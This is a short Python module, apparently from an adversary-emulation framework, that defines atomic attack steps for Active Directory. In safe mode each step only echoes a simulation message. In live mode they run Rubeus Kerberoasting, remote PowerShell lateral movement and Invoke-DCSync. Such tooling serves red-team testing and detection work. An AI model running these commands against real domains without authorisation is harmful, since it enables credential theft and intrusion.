from __future__ import annotations

from typing import Protocol


class Executor(Protocol):
    """Minimal executor interface used by atomic steps."""

    def run(self, command: str) -> str:
        """Execute a command on a remote host."""


def noop(executor: Executor, safe: bool) -> str:
    """No operation step used for precheck/cleanup."""

    return executor.run("echo noop")


def kerberoast(executor: Executor, safe: bool) -> str:
    """Simulate or execute Kerberoasting via Rubeus."""

    if safe:
        return executor.run("echo Simulating Kerberoasting")
    return executor.run("Rubeus kerberoast /nowrap /outfile:kerberoast.txt")


def lateral_psexec(executor: Executor, safe: bool, target: str) -> str:
    """Simulate or execute PsExec-like lateral movement."""

    if safe:
        return executor.run(f"echo Simulating PsExec to {target}")
    return executor.run(
        "powershell -Command \"Invoke-Command -ComputerName {} -ScriptBlock {{hostname}}\"".format(
            target
        )
    )


def dcsync(executor: Executor, safe: bool) -> str:
    """Simulate or execute DCSync (event log read in safe mode)."""

    if safe:
        return executor.run("echo Simulating DCSync via event 4662")
    return executor.run("Invoke-DCSync")
